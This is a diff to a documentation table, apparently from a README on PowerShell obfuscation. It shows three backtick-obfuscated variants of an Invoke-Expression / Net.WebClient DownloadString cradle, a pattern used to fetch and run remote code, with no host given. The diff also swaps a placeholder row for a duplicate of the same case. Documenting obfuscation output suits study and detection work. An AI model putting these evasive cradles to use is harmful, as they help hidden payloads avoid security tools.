@@ -45,7 +45,7 @@ you can copy the results from all cases for one or more obfuscation methods and 
 | :---: | :---: | :---: | :---: |
 | 1 | TOKEN\COMMAND\1 | <p> inVoK`E-e`xpRESSi`oN (nEW`-O`Bject Net.WebClient).DownloadString <br> InVO`KE-exPr`e`SS`ION (N`ew-Ob`J`ect Net.WebClient).DownloadString <br> I`NVoke`-`e`XpREs`s`iON (nE`W-ob`Je`ct Net.WebClient).DownloadString </p> | This option basicaly applies ticks |
 
-<table width="600" border="1">
+<table border="1">
  <tr>
    <th align="center">Case #</th>
    <th align="center">Option</th>
@@ -55,17 +55,22 @@ you can copy the results from all cases for one or more obfuscation methods and 
  <tr>
    <td align="center">1</td>
    <td align="center">TOKEN\COMMAND\1</td>
-   <td align="center" style="white-space:nowrap;"> inVoK`E-e`xpRESSi`oN (nEW`-O`Bject Net.WebClient).DownloadString
-   InVO`KE-exPr`e`SS`ION (N`ew-Ob`J`ect Net.WebClient).DownloadString
-   I`NVoke`-`e`XpREs`s`iON (nE`W-ob`Je`ct Net.WebClient).DownloadString
+   <td align="center" style="white-space:nowrap;"> 
+      inVoK`E-e`xpRESSi`oN (nEW`-O`Bject Net.WebClient).DownloadString <br/> 
+      InVO`KE-exPr`e`SS`ION (N`ew-Ob`J`ect Net.WebClient).DownloadString <br/> 
+      I`NVoke`-`e`XpREs`s`iON (nE`W-ob`Je`ct Net.WebClient).DownloadString
    </td>
-   <td align="center">This option basicaly applies ticks</td>
+   <td align="left">This option basicaly applies ticks</td>
  </tr>
  <tr>
-   <td align="center">Eve</td>
-   <td align="center">Jackson</td>
-   <td align="center">94</td>
-   <td align="center">94</td>
+   <td align="center">1</td>
+   <td align="center">TOKEN\COMMAND\1</td>
+   <td align="center" style="white-space:nowrap;"> 
+      inVoK`E-e`xpRESSi`oN (nEW`-O`Bject Net.WebClient).DownloadString <br/> 
+      InVO`KE-exPr`e`SS`ION (N`ew-Ob`J`ect Net.WebClient).DownloadString <br/> 
+      I`NVoke`-`e`XpREs`s`iON (nE`W-ob`Je`ct Net.WebClient).DownloadString
+   </td>
+   <td align="left">This option basicaly applies ticks</td>
  </tr>
 </table> 
 
